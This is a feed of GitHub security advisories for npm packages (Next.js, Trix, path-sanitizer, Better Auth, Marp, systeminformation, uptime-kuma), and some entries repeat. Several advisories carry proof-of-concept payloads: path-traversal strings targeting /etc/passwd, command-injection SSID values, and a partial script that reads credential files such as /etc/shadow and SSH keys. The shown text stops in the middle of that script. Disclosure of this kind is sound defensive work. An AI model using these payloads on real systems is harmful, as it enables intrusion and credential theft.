<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2025-01-10T05:01:27.174Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[next] Next.js Allows a Denial of Service (DoS) with Server Actions]]></title>
        <id>https://github.com/advisories/GHSA-7m27-7ghc-44w9</id>
        <link href="https://github.com/advisories/GHSA-7m27-7ghc-44w9"/>
        <updated>2025-01-07T16:24:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A Denial of Service (DoS) attack allows attackers to construct requests that leaves requests to Server Actions hanging until the hosting provider cancels the function execution.</p>
<p><em>Note: Next.js server is idle during that time and only keeps the connection open. CPU and memory footprint are low during that time.</em></p>
<p>Deployments without any protection against long running Server Action invocations are especially vulnerable. Hosting providers like Vercel or Netlify set a default maximum duration on function execution to reduce the risk of excessive billing.</p>
<p>This is the same issue as if the incoming HTTP request has an invalid <code>Content-Length</code> header or never closes. If the host has no other mitigations to those then this vulnerability is novel.</p>
<p>This vulnerability affects only Next.js deployments using Server Actions.</p>
<h3 id="patches">Patches</h3>
<p>This vulnerability was resolved in Next.js 14.2.21, 15.1.2, and 13.5.8. We recommend that users upgrade to a safe version.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no official workarounds for this vulnerability.</p>
<h3 id="credits">Credits</h3>
<p>Thanks to the PackDraw team for responsibly disclosing this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-7m27-7ghc-44w9">https://github.com/vercel/next.js/security/advisories/GHSA-7m27-7ghc-44w9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56332">https://nvd.nist.gov/vuln/detail/CVE-2024-56332</a></li>
<li><a href="https://github.com/advisories/GHSA-7m27-7ghc-44w9">https://github.com/advisories/GHSA-7m27-7ghc-44w9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7m27-7ghc-44w9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-03T20:19:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next] Next.js Allows a Denial of Service (DoS) with Server Actions]]></title>
        <id>https://github.com/advisories/GHSA-7m27-7ghc-44w9</id>
        <link href="https://github.com/advisories/GHSA-7m27-7ghc-44w9"/>
        <updated>2025-01-07T16:24:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A Denial of Service (DoS) attack allows attackers to construct requests that leaves requests to Server Actions hanging until the hosting provider cancels the function execution.</p>
<p><em>Note: Next.js server is idle during that time and only keeps the connection open. CPU and memory footprint are low during that time.</em></p>
<p>Deployments without any protection against long running Server Action invocations are especially vulnerable. Hosting providers like Vercel or Netlify set a default maximum duration on function execution to reduce the risk of excessive billing.</p>
<p>This is the same issue as if the incoming HTTP request has an invalid <code>Content-Length</code> header or never closes. If the host has no other mitigations to those then this vulnerability is novel.</p>
<p>This vulnerability affects only Next.js deployments using Server Actions.</p>
<h3 id="patches">Patches</h3>
<p>This vulnerability was resolved in Next.js 14.2.21, 15.1.2, and 13.5.8. We recommend that users upgrade to a safe version.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no official workarounds for this vulnerability.</p>
<h3 id="credits">Credits</h3>
<p>Thanks to the PackDraw team for responsibly disclosing this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-7m27-7ghc-44w9">https://github.com/vercel/next.js/security/advisories/GHSA-7m27-7ghc-44w9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56332">https://nvd.nist.gov/vuln/detail/CVE-2024-56332</a></li>
<li><a href="https://github.com/advisories/GHSA-7m27-7ghc-44w9">https://github.com/advisories/GHSA-7m27-7ghc-44w9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7m27-7ghc-44w9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-03T20:19:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next] Next.js Allows a Denial of Service (DoS) with Server Actions]]></title>
        <id>https://github.com/advisories/GHSA-7m27-7ghc-44w9</id>
        <link href="https://github.com/advisories/GHSA-7m27-7ghc-44w9"/>
        <updated>2025-01-07T16:24:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A Denial of Service (DoS) attack allows attackers to construct requests that leaves requests to Server Actions hanging until the hosting provider cancels the function execution.</p>
<p><em>Note: Next.js server is idle during that time and only keeps the connection open. CPU and memory footprint are low during that time.</em></p>
<p>Deployments without any protection against long running Server Action invocations are especially vulnerable. Hosting providers like Vercel or Netlify set a default maximum duration on function execution to reduce the risk of excessive billing.</p>
<p>This is the same issue as if the incoming HTTP request has an invalid <code>Content-Length</code> header or never closes. If the host has no other mitigations to those then this vulnerability is novel.</p>
<p>This vulnerability affects only Next.js deployments using Server Actions.</p>
<h3 id="patches">Patches</h3>
<p>This vulnerability was resolved in Next.js 14.2.21, 15.1.2, and 13.5.8. We recommend that users upgrade to a safe version.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no official workarounds for this vulnerability.</p>
<h3 id="credits">Credits</h3>
<p>Thanks to the PackDraw team for responsibly disclosing this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-7m27-7ghc-44w9">https://github.com/vercel/next.js/security/advisories/GHSA-7m27-7ghc-44w9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56332">https://nvd.nist.gov/vuln/detail/CVE-2024-56332</a></li>
<li><a href="https://github.com/advisories/GHSA-7m27-7ghc-44w9">https://github.com/advisories/GHSA-7m27-7ghc-44w9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7m27-7ghc-44w9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-03T20:19:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[trix] Trix allows Cross-site Scripting via `javascript:` url in a link]]></title>
        <id>https://github.com/advisories/GHSA-j386-3444-qgwg</id>
        <link href="https://github.com/advisories/GHSA-j386-3444-qgwg"/>
        <updated>2025-01-03T19:26:15.000Z</updated>
        <content type="html"><![CDATA[<p>The Trix editor, versions prior to 2.1.11, is vulnerable to XSS when pasting malicious code in the link field.</p>
<h3 id="impact">Impact</h3>
<p>An attacker could trick the user to copy&amp;paste a malicious <code>javascript:</code> URL as a link that would execute arbitrary JavaScript code within the context of the user's session, potentially leading to unauthorized actions being performed or sensitive information being disclosed.</p>
<p>See <a href="https://gist.github.com/th4s1s/3921fd9c3e324ad9a3e0d846166e3eb8">https://gist.github.com/th4s1s/3921fd9c3e324ad9a3e0d846166e3eb8</a></p>
<h3 id="patches">Patches</h3>
<p>Update Recommendation: Users should upgrade to Trix editor version 2.1.12 or later.</p>
<h3 id="workarounds">Workarounds</h3>
<p>This is not really a workaround but something that should be considered in addition to upgrading to the patched version. If affected users can disallow browsers that don't support a Content Security Policy, then this would be an effective workaround for this and all XSS vulnerabilities. Set CSP policies such as script-src 'self' to ensure that only scripts hosted on the same origin are executed, and explicitly prohibit inline scripts using script-src-elem.</p>
<h3 id="references">References</h3>
<p><a href="https://gist.github.com/th4s1s/3921fd9c3e324ad9a3e0d846166e3eb8">https://gist.github.com/th4s1s/3921fd9c3e324ad9a3e0d846166e3eb8</a></p>
<h3 id="credits">Credits</h3>
<p>This vulnerability was reported by Hackerone researcher <a href="https://hackerone.com/lio346?type=user">https://hackerone.com/lio346?type=user</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/basecamp/trix/security/advisories/GHSA-j386-3444-qgwg">https://github.com/basecamp/trix/security/advisories/GHSA-j386-3444-qgwg</a></li>
<li><a href="https://github.com/basecamp/trix/commit/180c8d337f18e1569cea6ef29b4d03ffff5b5faa">https://github.com/basecamp/trix/commit/180c8d337f18e1569cea6ef29b4d03ffff5b5faa</a></li>
<li><a href="https://github.com/basecamp/trix/commit/c4f0d6f80654603932af6685694f694e96593b93">https://github.com/basecamp/trix/commit/c4f0d6f80654603932af6685694f694e96593b93</a></li>
<li><a href="https://gist.github.com/th4s1s/3921fd9c3e324ad9a3e0d846166e3eb8">https://gist.github.com/th4s1s/3921fd9c3e324ad9a3e0d846166e3eb8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-21610">https://nvd.nist.gov/vuln/detail/CVE-2025-21610</a></li>
<li><a href="https://github.com/advisories/GHSA-j386-3444-qgwg">https://github.com/advisories/GHSA-j386-3444-qgwg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j386-3444-qgwg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-03T16:29:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[path-sanitizer] path-sanitizer allows bypassing the existing filters to achieve path-traversal vulnerability ]]></title>
        <id>https://github.com/advisories/GHSA-94p5-r7cc-3rpr</id>
        <link href="https://github.com/advisories/GHSA-94p5-r7cc-3rpr"/>
        <updated>2025-01-02T12:52:43.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>This is a POC for a path-sanitizer <a href="https://www.npmjs.com/package/path-sanitizer">npm package</a>. The filters can be bypassed and can result in path traversal.</p>
<p>Payload: <code>..=%5c</code> can be used to bypass this on CLI (along with other candidates). Something similar would likely work on web apps as well. </p>
<h3 id="poc">PoC</h3>
<p>Here's the code to test for the filter bypass:</p>
<pre><code class="language-js">const sanitize = require("path-sanitizer")
const path = require("path")
const fs = require("fs")

// Real scenario:
function routeHandler(myPath) {
  // Lets just assume that the path was extracted from the request
  // We want to read a file in the C:\Users\user\Desktop\myApp\ directory
  // But the user should be able to access C:\Users\user\Desktop\
  // So we need to sanitize the path

  const APP_DIR = "/var/hacker"
  const sanitized = path.join(APP_DIR, sanitize(myPath))

  // Now we would usally read the file
  // But in this case we just gonna print the path
  // console.log(sanitized)
  return sanitized
}

function readFile(filePath) {
  const absolutePath = path.resolve(filePath) // Resolve to absolute path

  fs.readFile(absolutePath, "utf8", (err, data) =&gt; {
    if (err) {
      console.error(`Error reading the file: ${err.message}`)
      return
    }
    console.log(`Contents of the file ${filePath} :\n${data}`)
  })
}

input_user_bypass = "..=%5c..=%5c..=%5c..=%5c..=%5c..=%5c..=%5ctmp/hacked.txt"
// input_user_bypass = "..=%5c..=%5c..=%5c..=%5c..=%5c..=%5c..=%5cetc/passwd"
input_user_payload = "../../../../../../../../tmp/hacked.txt"

readFile(routeHandler(input_user_bypass))
readFile(routeHandler(input_user_payload))
</code></pre>
<p>Here is a video POC: (this is a Loom POC, only users with the UUID of the video can see it) </p>
<p><a href="https://www.loom.com/share/b766ece5193842848ce7562fcd559256?sid=fd826eb6-0eee-4601-bf0e-9cfee5c56e9d">https://www.loom.com/share/b766ece5193842848ce7562fcd559256?sid=fd826eb6-0eee-4601-bf0e-9cfee5c56e9d</a></p>
<h3 id="impact">Impact</h3>
<p>Any CLI tool or library using this package can be/will be vulnerable to Path traversal.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cabraviva/path-sanitizer/security/advisories/GHSA-94p5-r7cc-3rpr">https://github.com/cabraviva/path-sanitizer/security/advisories/GHSA-94p5-r7cc-3rpr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56198">https://nvd.nist.gov/vuln/detail/CVE-2024-56198</a></li>
<li><a href="https://github.com/cabraviva/path-sanitizer/commit/b6d2319eac910dffdfacc8460f5b5cc5a1518ead">https://github.com/cabraviva/path-sanitizer/commit/b6d2319eac910dffdfacc8460f5b5cc5a1518ead</a></li>
<li><a href="https://www.loom.com/share/b766ece5193842848ce7562fcd559256?sid=fd826eb6-0eee-4601-bf0e-9cfee5c56e9d">https://www.loom.com/share/b766ece5193842848ce7562fcd559256?sid=fd826eb6-0eee-4601-bf0e-9cfee5c56e9d</a></li>
<li><a href="https://github.com/advisories/GHSA-94p5-r7cc-3rpr">https://github.com/advisories/GHSA-94p5-r7cc-3rpr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-94p5-r7cc-3rpr</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-01-02T12:52:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[better-auth] Better Auth has an Open Redirect Vulnerability in Verify Email Endpoint]]></title>
        <id>https://github.com/advisories/GHSA-8jhw-6pjj-8723</id>
        <link href="https://github.com/advisories/GHSA-8jhw-6pjj-8723"/>
        <updated>2024-12-30T18:45:18.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>An <strong>open redirect vulnerability</strong> has been identified in the <strong>verify email endpoint</strong> of Better Auth, potentially allowing attackers to redirect users to malicious websites. This issue affects users relying on email verification links generated by the library.</p>
<h2 id="affected-versions">Affected Versions</h2>
<ul>
<li>All versions prior to <strong>v1.1.6</strong>.</li>
</ul>
<h2 id="impact">Impact</h2>
<p>Attackers could craft malicious email verification links that exploit the redirect functionality to send users to untrusted domains. This can result in:</p>
<ul>
<li><strong>Phishing attacks</strong> – Users may unknowingly enter sensitive information on fake login pages.</li>
<li><strong>Reputation damage</strong> – Trust issues for applications using Better Auth.</li>
</ul>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<p>The verify email callback endpoint accepts a <code>callbackURL</code> parameter. Unlike other verification methods, email verification only uses JWT to verify and redirect without proper validation of the target domain. The origin checker is bypassed in this scenario because it only checks for <code>POST</code> requests. An attacker can manipulate this parameter to redirect users to arbitrary URLs controlled by the attacker.</p>
<p><strong>Example Exploit:</strong></p>
<pre><code>https://example.com/auth/verify-email?token=abcd1234&amp;callbackURL=https://malicious-site.com
</code></pre>
<h2 id="patches">Patches</h2>
<p>Upgrade to Better Auth <strong>v1.1.6</strong> or later. This version enforces domain validation for <code>callbackURL</code> for <code>/verify-email</code> path and for all other <code>GET</code> endpoints.</p>
<h2 id="workarounds">Workarounds</h2>
<p>You can also use hooks to pre-check URLs in your auth instance to prevent this without upgrading:</p>
<pre><code class="language-ts">const auth = betterAuth({
    hooks: {
         before: (ctx) =&gt; {
            if (ctx.path === "/verify-email") {
               const callbackURL = ctx.query.callbackURL; // Check if this is a trusted callback URL or not
            }
         }
    }
})
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/better-auth/better-auth/security/advisories/GHSA-8jhw-6pjj-8723">https://github.com/better-auth/better-auth/security/advisories/GHSA-8jhw-6pjj-8723</a></li>
<li><a href="https://github.com/better-auth/better-auth/commit/deb3d73aea90d0468d92723f4511542b593e522f">https://github.com/better-auth/better-auth/commit/deb3d73aea90d0468d92723f4511542b593e522f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56734">https://nvd.nist.gov/vuln/detail/CVE-2024-56734</a></li>
<li><a href="https://github.com/advisories/GHSA-8jhw-6pjj-8723">https://github.com/advisories/GHSA-8jhw-6pjj-8723</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8jhw-6pjj-8723</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-12-30T16:49:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@marp-team/marp-core] Marp Core allows XSS by improper neutralization of HTML sanitization]]></title>
        <id>https://github.com/advisories/GHSA-x52f-h5g4-8qv5</id>
        <link href="https://github.com/advisories/GHSA-x52f-h5g4-8qv5"/>
        <updated>2024-12-26T21:46:03.000Z</updated>
        <content type="html"><![CDATA[<p>Marp Core (<a href="https://www.npmjs.com/package/@marp-team/marp-core"><code>@marp-team/marp-core</code></a>) from v3.0.2 to v3.9.0 and v4.0.0, are vulnerable to cross-site scripting (XSS)  due to improper neutralization of HTML sanitization.</p>
<h3 id="impact">Impact</h3>
<p>Marp Core includes an HTML sanitizer with allowlist support. In the affected versions, the built-in allowlist is enabled by default. When the allowlist is active, if insufficient HTML comments are included, the sanitizer may fail to properly sanitize HTML content and lead cross-site scripting (XSS).</p>
<h3 id="patches">Patches</h3>
<p>Marp Core <a href="https://github.com/marp-team/marp-core/releases/tag/v3.9.1">v3.9.1</a> and <a href="https://github.com/marp-team/marp-core/releases/tag/v4.0.1">v4.0.1</a> have been patched to fix that.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you are unable to update the package immediately, disable all HTML tags by setting <code>html: false</code> option in the <code>Marp</code> class constructor.</p>
<pre><code class="language-javascript">const marp = new Marp({ html: false })
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://github.com/marp-team/marp-core/pull/282">https://github.com/marp-team/marp-core/pull/282</a></li>
<li><a href="https://github.com/marp-team/marp-core/commit/61a1def244d1b6faa8e2c0be97ec0b68cab3ab49">https://github.com/marp-team/marp-core/commit/61a1def244d1b6faa8e2c0be97ec0b68cab3ab49</a></li>
</ul>
<h3 id="credits">Credits</h3>
<p>Thanks to @Ry0taK for finding out this vulnerability.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/marp-team/marp-core/security/advisories/GHSA-x52f-h5g4-8qv5">https://github.com/marp-team/marp-core/security/advisories/GHSA-x52f-h5g4-8qv5</a></li>
<li><a href="https://github.com/marp-team/marp-core/pull/282">https://github.com/marp-team/marp-core/pull/282</a></li>
<li><a href="https://github.com/marp-team/marp-core/commit/61a1def244d1b6faa8e2c0be97ec0b68cab3ab49">https://github.com/marp-team/marp-core/commit/61a1def244d1b6faa8e2c0be97ec0b68cab3ab49</a></li>
<li><a href="https://github.com/marp-team/marp-core/releases/tag/v3.9.1">https://github.com/marp-team/marp-core/releases/tag/v3.9.1</a></li>
<li><a href="https://github.com/marp-team/marp-core/releases/tag/v4.0.1">https://github.com/marp-team/marp-core/releases/tag/v4.0.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56510">https://nvd.nist.gov/vuln/detail/CVE-2024-56510</a></li>
<li><a href="https://github.com/advisories/GHSA-x52f-h5g4-8qv5">https://github.com/advisories/GHSA-x52f-h5g4-8qv5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x52f-h5g4-8qv5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-26T18:25:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@marp-team/marp-core] Marp Core allows XSS by improper neutralization of HTML sanitization]]></title>
        <id>https://github.com/advisories/GHSA-x52f-h5g4-8qv5</id>
        <link href="https://github.com/advisories/GHSA-x52f-h5g4-8qv5"/>
        <updated>2024-12-26T21:46:03.000Z</updated>
        <content type="html"><![CDATA[<p>Marp Core (<a href="https://www.npmjs.com/package/@marp-team/marp-core"><code>@marp-team/marp-core</code></a>) from v3.0.2 to v3.9.0 and v4.0.0, are vulnerable to cross-site scripting (XSS)  due to improper neutralization of HTML sanitization.</p>
<h3 id="impact">Impact</h3>
<p>Marp Core includes an HTML sanitizer with allowlist support. In the affected versions, the built-in allowlist is enabled by default. When the allowlist is active, if insufficient HTML comments are included, the sanitizer may fail to properly sanitize HTML content and lead cross-site scripting (XSS).</p>
<h3 id="patches">Patches</h3>
<p>Marp Core <a href="https://github.com/marp-team/marp-core/releases/tag/v3.9.1">v3.9.1</a> and <a href="https://github.com/marp-team/marp-core/releases/tag/v4.0.1">v4.0.1</a> have been patched to fix that.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you are unable to update the package immediately, disable all HTML tags by setting <code>html: false</code> option in the <code>Marp</code> class constructor.</p>
<pre><code class="language-javascript">const marp = new Marp({ html: false })
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://github.com/marp-team/marp-core/pull/282">https://github.com/marp-team/marp-core/pull/282</a></li>
<li><a href="https://github.com/marp-team/marp-core/commit/61a1def244d1b6faa8e2c0be97ec0b68cab3ab49">https://github.com/marp-team/marp-core/commit/61a1def244d1b6faa8e2c0be97ec0b68cab3ab49</a></li>
</ul>
<h3 id="credits">Credits</h3>
<p>Thanks to @Ry0taK for finding out this vulnerability.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/marp-team/marp-core/security/advisories/GHSA-x52f-h5g4-8qv5">https://github.com/marp-team/marp-core/security/advisories/GHSA-x52f-h5g4-8qv5</a></li>
<li><a href="https://github.com/marp-team/marp-core/pull/282">https://github.com/marp-team/marp-core/pull/282</a></li>
<li><a href="https://github.com/marp-team/marp-core/commit/61a1def244d1b6faa8e2c0be97ec0b68cab3ab49">https://github.com/marp-team/marp-core/commit/61a1def244d1b6faa8e2c0be97ec0b68cab3ab49</a></li>
<li><a href="https://github.com/marp-team/marp-core/releases/tag/v3.9.1">https://github.com/marp-team/marp-core/releases/tag/v3.9.1</a></li>
<li><a href="https://github.com/marp-team/marp-core/releases/tag/v4.0.1">https://github.com/marp-team/marp-core/releases/tag/v4.0.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56510">https://nvd.nist.gov/vuln/detail/CVE-2024-56510</a></li>
<li><a href="https://github.com/advisories/GHSA-x52f-h5g4-8qv5">https://github.com/advisories/GHSA-x52f-h5g4-8qv5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x52f-h5g4-8qv5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-26T18:25:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[systeminformation] Systeminformation has command injection vulnerability in getWindowsIEEE8021x (SSID)]]></title>
        <id>https://github.com/advisories/GHSA-cvv5-9h9w-qp2m</id>
        <link href="https://github.com/advisories/GHSA-cvv5-9h9w-qp2m"/>
        <updated>2024-12-20T21:37:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The SSID is not sanitized when before it is passed as a parameter to cmd.exe in the <code>getWindowsIEEE8021x</code> function. This means that malicious content in the SSID can be executed as OS commands. </p>
<h3 id="details">Details</h3>
<p>I have exploited this vulnerability in a Windows service using version 5.22.11 of the module, to escalate privileges (in an environment where I am authorized to do so). However, as far as I can see from the code, it is still present in master branch at time of writing, on line <a href="https://github.com/sebhildebrandt/systeminformation/blob/3a92931c7d46605ffddc1aacb97a9727273b2888/lib/network.js#L403">403/404 of network.js</a>.</p>
<p>The SSID is obtained from <code>netsh wlan show interface ...</code> in <code>getWindowsWirelessIfaceSSID</code>, and then passed to <code>cmd.exe /d /s /c "netsh wlan show profiles ...</code> in <code>getWindowsIEEE8021x</code>, without sanitization.</p>
<h3 id="poc">PoC</h3>
<p>First, the command injection payload should be included in the connected Wi-Fi SSID. For example create hotspot on mobile phone or other laptop, set SSID to payload, connect to it with victim Windows system. Two example SSID's to demonstrate exploitation are below.</p>
<p>Demonstration to run ping command indefinitely:</p>
<pre><code>a" | ping /t 127.0.0.1 &amp;
</code></pre>
<p>Run executable with privileges of the user in which vulnerable function is executed. Chosen executable should should be placed in (assuming system drive is C): <code>C:\a\a.exe</code>.</p>
<pre><code>a" | %SystemDrive%\a\a.exe &amp;
</code></pre>
<p>Then, the vulnerable function can be executed on the victim system, for example, using:</p>
<pre><code>const si = require('systeminformation');
si.networkInterfaces((net) =&gt; { console.log(net) });
</code></pre>
<p>Now the chosen command, <code>PING.exe</code> or <code>a.exe</code> will be run through the cmd.exe command line.</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability may enable an attacker, depending on how the package is used, to perform remote code execution or local privilege escalation.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-cvv5-9h9w-qp2m">https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-cvv5-9h9w-qp2m</a></li>
<li><a href="https://github.com/sebhildebrandt/systeminformation/commit/f7af0a67b78e7894335a6cad510566a25e06ae41">https://github.com/sebhildebrandt/systeminformation/commit/f7af0a67b78e7894335a6cad510566a25e06ae41</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56334">https://nvd.nist.gov/vuln/detail/CVE-2024-56334</a></li>
<li><a href="https://github.com/advisories/GHSA-cvv5-9h9w-qp2m">https://github.com/advisories/GHSA-cvv5-9h9w-qp2m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cvv5-9h9w-qp2m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-12-20T19:13:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[uptime-kuma] uptime-kuma vulnerable to Local File Inclusion (LFI) via Improper URL Handling in `Real-Browser` monitor]]></title>
        <id>https://github.com/advisories/GHSA-2qgm-m29m-cj2h</id>
        <link href="https://github.com/advisories/GHSA-2qgm-m29m-cj2h"/>
        <updated>2024-12-20T21:36:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An <strong>Improper URL Handling Vulnerability</strong> allows an attacker to access sensitive local files on the server by exploiting the <code>file:///</code> protocol. This vulnerability is triggered via the <strong>"real-browser"</strong> request type, which takes a screenshot of the URL provided by the attacker. By supplying local file paths, such as <code>file:///etc/passwd</code>, an attacker can read sensitive data from the server.</p>
<h3 id="details">Details</h3>
<p>The vulnerability arises because the system does not properly validate or sanitize the user input for the URL field. Specifically:</p>
<ol>
<li><p>The URL input (<code>&lt;input data-v-5f5c86d7="" id="url" type="url" class="form-control" pattern="https?://.+" required=""&gt;</code>) allows users to input arbitrary file paths, including those using the <code>file:///</code> protocol, without server-side validation.</p>
</li>
<li><p>The server then uses the user-provided URL to make a request, passing it to a browser instance that performs the "real-browser" request, which takes a screenshot of the content at the given URL. If a local file path is entered (e.g., <code>file:///etc/passwd</code>), the browser fetches and captures the file’s content.</p>
</li>
</ol>
<pre><code class="language-javascript">const browser = await getBrowser();
const context = await browser.newContext();
const page = await context.newPage();

const res = await page.goto(monitor.url, {
    waitUntil: "networkidle",
    timeout: monitor.interval * 1000 * 0.8,
});

let filename = jwt.sign(monitor.id, server.jwtSecret) + ".png";

await page.screenshot({
    path: path.join(Database.screenshotDir, filename),
});

await context.close();
</code></pre>
<p>Since the user input is not validated, an attacker can manipulate the URL to request local files (e.g., <code>file:///etc/passwd</code>), and the system will capture a screenshot of the file's content, potentially exposing sensitive data.</p>
<h3 id="poc">PoC</h3>
<ol>
<li><strong>Instructions</strong>:<ul>
<li>Enter a local file path as the URL, such as: <code>view-source:file:///etc/passwd</code>.</li>
<li>The server will process the URL and, in "real-browser" mode, capture a screenshot of the file content.</li>
</ul>
</li>
</ol>
<p>Example PoC:</p>
<ol>
<li>Log in to the application with valid credentials:</li>
</ol>
<pre><code class="language-javascript">const { io } = require("socket.io-client");

// Server configuration and credentials
const CONFIG = {
  serverUrl: "ws://localhost:3001",
  credentials: {
    username: "admin",
    password: "password1"
  },
  requestType: {
    REAL_BROWSER: "real-browser",
    HTTP: "http"
  },
  urlHeader: {
    VIEW_SOURCE: "view-source:file:///",
    FILE: "file:///"
  }
};

// List of sensitive files on a Linux system
const SENSITIVE_FILES = [
  "/etc/passwd",
  "/etc/shadow",
  "/etc/hosts",
  "/etc/hostname",
  "/etc/network/interfaces", // May vary depending on the distribution
  "/etc/ssh/ssh_config",
  "/etc/ssh/sshd_config",
  "~/.ssh/authorized_keys",
  "~/.ssh/id_rsa",
  "/etc/ssl/private/*.key",
  "/etc/ssl/certs/*.crt",
  "/app/data/kuma.db", // Uptime Kuma database file
  "/app/data/config.json" // Uptime Kuma configuration file
];

// Function to send a request and wait for the response
function sendRequest(socket, filePath, type) {
  return new Promise((resolve, reject) =&gt; {
    fileUrl = CONFIG.urlHeader.VIEW_SOURCE + filePath;
    if (type == CONFIG.requestType.HTTP) {
      fileUrl = CONFIG.urlHeader.FILE + filePath;
    }
    socket.emit("add", {
      type: type,
      name: type + " " + filePath,
      url: fileUrl,
      method: "GET",
      maxretries: 0,
      timeout: 500,
      notificationIDList: {},
      ignoreTls: true,
      upsideDown: false,
      accepted_statuscodes: ["200-299"]
    }, (res) =&gt; {
      console.log(`Response for file ${filePath}:`, res);
      resolve();
    });
  });
}

// Main function for connecting and sending the 'add' request
(async () =&gt; {
  const socket = io(CONFIG.serverUrl);

  // Handle connection errors
  socket.on("connect_error", (err) =&gt; {
    console.error("Connection failed:", err.message);
  });

  try {
